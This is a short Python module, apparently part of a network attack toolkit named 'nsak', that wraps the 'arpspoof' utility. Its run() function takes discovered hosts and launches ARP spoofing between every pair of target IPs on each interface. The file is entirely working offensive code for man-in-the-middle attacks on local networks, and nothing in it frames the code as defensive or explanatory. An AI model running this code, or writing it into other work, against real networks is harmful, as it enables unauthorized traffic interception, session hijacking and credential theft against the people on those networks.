import subprocess
import logging

from nsak.core import IPAddress
from nsak.core.network import NetworkDiscoveryResultMap
from nsak.core.network.configuration import EthernetConfiguration

logger = logging.getLogger(__name__)

def arp_spoof(
        network_interface: EthernetConfiguration,
        spoof_ip: IPAddress,
        target_ip: IPAddress | None = None
) -> subprocess.Popen:
    """
    Start arp spoofing on the provided interface.

    :param network_interface:
    :param spoof_ip:
    :param target_ip: If target ip is not provided, spoofing will be performed on all ips on the interface
    :return:
    """
    args = ["arpspoof", "-i", network_interface.name, str(spoof_ip)]

    if target_ip:
        args.extend(["-t", str(target_ip)])

    return subprocess.Popen(args)


def run(network_discovery_result_map: NetworkDiscoveryResultMap) -> list[subprocess.Popen]:
    """
    Start arp spoofing on the provided interface.
    """
    processes = []

    # @TODO: this should have more sophisticated logic:
    # spoof only ips on interfaces which are in the respective subnet
    for name, network_discovery_result in network_discovery_result_map.results.items():
        network_interface = network_discovery_result.network_interface
        for spoof_ip in network_discovery_result.target_ips:
            for target_ip in network_discovery_result.target_ips:
                if spoof_ip == target_ip:
                    continue
                logger.info(f"[+] Spoofing {spoof_ip} on {name}")
                process = arp_spoof(network_interface, spoof_ip, target_ip)
                processes.append(process)

    return processes
